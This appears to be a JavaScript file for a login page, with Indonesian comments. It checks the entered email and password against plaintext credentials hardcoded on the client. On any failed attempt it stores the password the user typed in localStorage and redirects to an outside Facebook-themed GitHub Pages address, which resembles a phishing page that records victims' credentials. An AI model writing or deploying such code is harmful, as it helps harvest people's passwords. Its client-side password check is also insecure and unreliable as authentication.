// Aktifkan tombol jika kedua field terisi
function toggleButton() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();
    const button = document.getElementById("log");

    button.disabled = !(email && password);
}

// Fungsi login
function login() {
    const email = document.getElementById("email").value.trim();
    const password = document.getElementById("password").value.trim();

    // Contoh data pengguna yang benar
    const correctEmail = "user@example.com";
    const correctPassword = "123456";

    if (email === correctEmail && password === correctPassword) {
        alert("Login berhasil!");
    } else {
        // Simpan detail login yang salah
        localStorage.setItem("failedEmail", email);
        localStorage.setItem("failedPassword", password);

        // Arahkan ke halaman error (ubah ke URL Anda sendiri jika perlu)
        window.location.href = "https://shadowhunter117.github.io/facebook-info/";
    }
}
